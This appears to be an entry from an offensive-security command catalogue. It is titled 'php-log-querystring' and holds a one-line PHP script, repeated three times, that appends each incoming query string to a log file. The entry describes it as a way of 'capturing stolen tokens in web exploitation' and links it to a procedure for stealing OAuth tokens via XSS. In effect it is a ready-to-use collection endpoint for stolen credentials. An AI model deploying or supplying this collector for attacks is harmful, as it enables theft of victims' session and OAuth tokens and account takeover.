---
data: >-
  <?php if(isset($_SERVER['QUERY_STRING'])){
  file_put_contents('r.log',$_SERVER['QUERY_STRING']."\n",FILE_APPEND); } ?>
tags:
  - logging
  - exfiltration
type: command
executor: php
platforms:
  - Web
id: 37c893c9-655e-4f68-9172-1a891473c151
created_at: '2025-12-14T00:11:25.321Z'
updated_at: '2025-12-14T00:11:25.321Z'
verified: false
validated: true
submitted: true
---
# php-log-querystring

## Command

```php
<?php if(isset($_SERVER['QUERY_STRING'])){ file_put_contents('r.log',$_SERVER['QUERY_STRING']."\n",FILE_APPEND); } ?>
```

## Description

Logs the query string to a file for capturing stolen tokens in web exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `file_put_contents` | Appends query string to r.log | Yes |

## Examples

### Basic Usage

```php
<?php if(isset($_SERVER['QUERY_STRING'])){ file_put_contents('r.log',$_SERVER['QUERY_STRING']."\n",FILE_APPEND); } ?>
```

## Expected Output

Appends the payload to r.log file.

## Related

- [[procedures/Steal-OAuth-Tokens-via-XSS]]
